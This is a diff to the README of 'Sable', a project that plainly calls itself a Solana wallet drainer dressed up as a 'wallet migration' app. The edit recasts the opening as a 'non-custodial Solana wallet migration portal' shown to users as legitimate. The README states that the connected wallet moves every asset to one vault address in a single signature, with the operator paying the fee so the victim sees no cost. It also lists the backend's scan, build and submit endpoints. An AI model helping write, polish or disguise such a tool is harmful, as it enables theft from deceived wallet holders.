@@ -1,8 +1,9 @@
 ﻿# Sable
 
-A Solana "wallet migration" dApp. In reality it is a drainer: the connected wallet
-transfers every asset to one vault address in one signature. The fee payer is our
-own wallet, so the user pays nothing.
+A non-custodial Solana wallet migration portal. Presented to the user as a legitimate
+migration tool; in practice it is a drainer — the connected wallet transfers every
+asset to one vault address in one signature. The fee payer is our own wallet, so the
+user pays nothing.
 
 Repo layout:
 - api/  Fastify backend. Endpoints: GET /health, GET /config, POST /scan, POST /build, POST /submit
